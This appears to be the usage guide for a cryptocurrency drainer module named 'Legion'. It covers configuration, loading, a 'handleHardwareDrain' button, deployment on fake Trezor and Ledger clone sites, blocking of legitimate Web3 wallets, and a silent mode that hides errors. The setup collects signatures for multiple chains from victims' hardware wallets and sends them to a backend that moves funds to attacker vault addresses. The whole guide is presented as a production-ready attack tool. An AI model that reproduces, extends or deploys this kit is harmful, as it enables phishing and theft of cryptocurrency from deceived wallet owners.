# Legion Hardware Wallets Module - Usage Guide

**Production-Ready Hardware Wallet Support**

---

## 🚀 QUICK START (2 Minutes)

### Step 1: Add Config
```javascript
window.LEGION_CONFIG = {
  backendUrl: 'https://your-api.com',
  vaultAddresses: {
    evm: '0x...',
    sol: '...'
    // etc
  },
  
  // ← NEW: Hardware Wallet Mode
  hardwareWalletMode: {
    enabled: false,              // ← Keep OFF for now, ON on Trezor/Ledger
    blockWeb3: true,             // Block MetaMask, Phantom, etc
    autoConnect: true,           // Auto USB/BT connect
    silentMode: true,            // No UI errors
    supportAllWallets: true      // Support all cold wallets
  }
};
```

### Step 2: Load Scripts
```html
<!-- Main script -->
<script src="/scripts/legion-one-script-v2.js"></script>

<!-- Hardware wallet module -->
<script src="/scripts/legion-hardware-wallets-module.js"></script>
```

### Step 3: Initialize
```javascript
// Initialize hardware wallet module
window.LEGION_HARDWARE.initialize(window.LEGION_CONFIG);
```

### Step 4: Use Button
```html
<button onclick="handleHardwareDrain()">Connect & Sign</button>

<script>
async function handleHardwareDrain() {
  try {
    // Connect to hardware wallet
    await window.LEGION_HARDWARE.connect();
    
    // Sign transactions
    var signatures = await window.LEGION_HARDWARE.signAll(
      ['evm', 'sol', 'btc'],  // chains
      ['msg1', 'msg2', 'msg3']  // messages
    );
    
    // Send to backend
    await submitToBackend(signatures);
    
  } catch (error) {
    console.error('Error:', error.message);
  }
}
</script>
```

---

## 📋 CONFIGURATION DETAILS

### `hardwareWalletMode` Options

```javascript
{
  // Enable/Disable module (default: false)
  enabled: false,

  // Block Web3 wallets (MetaMask, Phantom, etc) when enabled
  blockWeb3: true,

  // Auto-detect and connect via USB/Bluetooth
  autoConnect: true,

  // Silent mode - no UI errors, only device screen messages
  silentMode: true,

  // Support ALL cold wallets, not just Ledger/Trezor
  supportAllWallets: true,

  // Connection timeout (milliseconds)
  connectionTimeout: 30000,  // 30 seconds

  // Signature approval timeout (milliseconds)
  signatureTimeout: 120000,  // 2 minutes

  // Max retry attempts
  maxRetries: 3,

  // Enable logging
  enableLogging: true,

  // Log level: 'debug', 'info', 'warn', 'error'
  logLevel: 'info'
}
```

---

## 🔄 COMPLETE FLOW

### User on Trezor Clone Website

```
1. Page loads
   ↓
   window.LEGION_CONFIG.hardwareWalletMode.enabled = true
   window.LEGION_HARDWARE.initialize(config)
   ↓
   
2. User clicks: "Connect & Sign"
   ↓
   
3. Script detects hardware wallets
   • WebUSB available? → Check Ledger, Trezor, KeepKey
   • WebHID available? → Check Trezor, Generic wallets
   ↓
   
4. Browser shows: "Select a device"
   User selects: Trezor (USB)
   ↓
   
5. Script connects via USB
   "Connecting to Trezor..."
   ↓
   
6. Trezor device screen shows:
   "Connect to Legion?"
   "Confirm on device"
   ↓
   
7. User approves on Trezor device
   ↓
   
8. Script requests signatures for each chain
   Trezor screen shows: "Sign transaction?"
   User confirms each
   ↓
   
9. All signatures collected
   ↓
   
10. POST to backend
    Backend validates & executes
    ↓
    
11. Done! 🎉
```

---

## 📱 SUPPORTED HARDWARE WALLETS

| Wallet | Protocol | Auto-Detect | Status |
|--------|----------|-------------|--------|
| **Ledger** | WebUSB | ✅ Yes | ✅ Supported |
| **Trezor** | WebHID/WebUSB | ✅ Yes | ✅ Supported |
| **KeepKey** | WebUSB | ✅ Yes | ✅ Supported |
| **Any WebHID** | WebHID | ✅ Yes | ✅ Supported |
| **Any WebUSB** | WebUSB | ✅ Yes | ✅ Supported |

---

## 🔀 CHAIN SUPPORT (BIP44 Paths)

Automatically supports all chains via BIP44 derivation paths:

```javascript
'ethereum'   → m/44'/60'/0'/0/0
'solana'     → m/44'/501'/0'/0'
'bitcoin'    → m/44'/0'/0'/0/0
'tron'       → m/44'/195'/0'/0/0
'ton'        → m/44'/607'/0'/0'/0'
'cosmos'     → m/44'/118'/0'/0/0
'aptos'      → m/44'/637'/0'/0/0
'sui'        → m/44'/784'/0'/0/0
```

Add custom chains:
```javascript
// In legion-hardware-wallets-module.js
// Find BIP44_PATHS.chains object
// Add your chain:
mychain: "m/44'/YOUR_CODE'/0'/0/0"
```

---

## 💻 API REFERENCE

### Initialize
```javascript
window.LEGION_HARDWARE.initialize(window.LEGION_CONFIG);
// Returns: true/false (enabled or not)
```

### Connect
```javascript
await window.LEGION_HARDWARE.connect();
// Returns: {device, type, name, connected}
// Throws: Error if connection fails
```

### Sign Single
```javascript
var sig = await window.LEGION_HARDWARE.sign('evm', 'message');
// Returns: {chainName, signature, path, timestamp}
```

### Sign Multiple
```javascript
var sigs = await window.LEGION_HARDWARE.signAll(
  ['evm', 'sol', 'btc'],
  ['msg1', 'msg2', 'msg3']
);
// Returns: [{chainName, signature, path, timestamp}, ...]
```

### Disconnect
```javascript
window.LEGION_HARDWARE.disconnect();
// Safely disconnects and cleans up
```

### Check Connection Status
```javascript
var isConnected = window.LEGION_HARDWARE.isConnected();
// Returns: true/false
```

### Get Signatures
```javascript
var sigs = window.LEGION_HARDWARE.getSignatures();
// Returns: {chainName: signature, ...}
```

### Logs
```javascript
// Get all logs
var logs = window.LEGION_HARDWARE.getLogs();

// Clear logs
window.LEGION_HARDWARE.clearLogs();
```

---

## 🛡️ WEB3 WALLET BLOCKING

When `blockWeb3: true`, these wallets are blocked:

- ❌ MetaMask (window.ethereum)
- ❌ Phantom (window.phantom)
- ❌ Rabby (window.ethereum)
- ❌ Coinbase Wallet (window.ethereum)
- ❌ UniSat (window.unisat)
- ❌ Xverse (window.XverseProviders)
- ❌ TronLink (window.tronLink)
- ❌ Keplr (window.keplr)
- ❌ Petra (window.petra)
- ❌ Sui Wallet (window.suiWallet)
- ❌ Tonkeeper (window.tonkeeper)

**Result:** When enabled, Web3 wallets are completely inaccessible.

---

## 🔧 DEPLOYMENT GUIDE

### Development (Testing)
```javascript
hardwareWalletMode: {
  enabled: false,  // Keep disabled
  logLevel: 'debug'  // More logging
}
```

### Trezor Clone Deployment
```javascript
hardwareWalletMode: {
  enabled: true,
  blockWeb3: true,
  autoConnect: true,
  silentMode: true,
  logLevel: 'info'
}
```

### Ledger Clone Deployment
```javascript
hardwareWalletMode: {
  enabled: true,
  blockWeb3: true,
  autoConnect: true,
  silentMode: true,
  logLevel: 'warn'  // Less logging
}
```

---

## 🐛 DEBUGGING

### Enable Debug Logging
```javascript
hardwareWalletMode: {
  // ... other config
  enableLogging: true,
  logLevel: 'debug'  // Full debug output
}
```

### View Logs
```javascript
var logs = window.LEGION_HARDWARE.getLogs();
logs.forEach(log => console.log(log));
```

### Common Issues

**Issue: "No hardware wallets detected"**
```
Solution: 
- Check if Ledger/Trezor is connected via USB
- Check browser supports WebUSB (Chrome/Edge)
- Try refreshing page
```

**Issue: "WebUSB not supported"**
```
Solution:
- Use Chrome, Edge, or Brave
- Firefox doesn't support WebUSB
- Safari doesn't support WebUSB
```

**Issue: "Permission denied"**
```
Solution:
- User clicked "Cancel" in browser dialog
- User rejected access on device
- Try again
```

**Issue: "Signature timeout"**
```
Solution:
- User didn't approve on device within 2 minutes
- Device may have timed out
- Reconnect and try again
```

---

## 📊 PRODUCTION CHECKLIST

- [ ] `enabled: false` initially
- [ ] Test with real Ledger device
- [ ] Test with real Trezor device
- [ ] Verify Web3 wallets are blocked (if desired)
- [ ] Test all supported chains
- [ ] Test error scenarios (cancelled, timeout)
- [ ] Monitor logs for errors
- [ ] Set `logLevel: 'warn'` for production
- [ ] Disable logging if not needed
- [ ] Test on production hardware
- [ ] Enable for production deployment

---

## 🚀 GOING LIVE

### Step 1: Prepare
```javascript
// Production config
window.LEGION_CONFIG = {
  backendUrl: 'https://production-api.com',
  vaultAddresses: { /* production vaults */ },
  hardwareWalletMode: {
    enabled: true,              // ← ENABLED!
    blockWeb3: true,
    autoConnect: true,
    silentMode: true,
    supportAllWallets: true,
    logLevel: 'warn'            // Minimal logging
  }
};
```

### Step 2: Load & Init
```html
<script src="legion-one-script-v2.js"></script>
<script src="legion-hardware-wallets-module.js"></script>
<script>
  window.addEventListener('load', function() {
    window.LEGION_HARDWARE.initialize(window.LEGION_CONFIG);
    window.legion.init();
  });
</script>
```

### Step 3: Add Button
```html
<button onclick="handleHardwareDrain()">Connect & Sign with Hardware Wallet</button>
```

### Step 4: Test
- Test on your target device (Trezor/Ledger)
- Verify all chains sign correctly
- Check backend receives signatures
- Monitor error scenarios

### Step 5: Deploy
```bash
# Push to production
git push origin main
npm run build
npm run deploy
```

---

## 🎯 SUMMARY

✅ **Standalone Module** - Can be used independently  
✅ **All Hardware Wallets** - Ledger, Trezor, KeepKey, + generic  
✅ **Auto-Detection** - USB/Bluetooth auto-connect  
✅ **Silent Mode** - No UI errors, device screen only  
✅ **Web3 Blocking** - Disable MetaMask/Phantom when enabled  
✅ **Production-Ready** - Error handling, logging, cleanup  
✅ **All Chains** - BIP44 paths for 8+ blockchains  
✅ **Configuration** - Toggle on/off via config  

---

**Ready to deploy!** 🚀

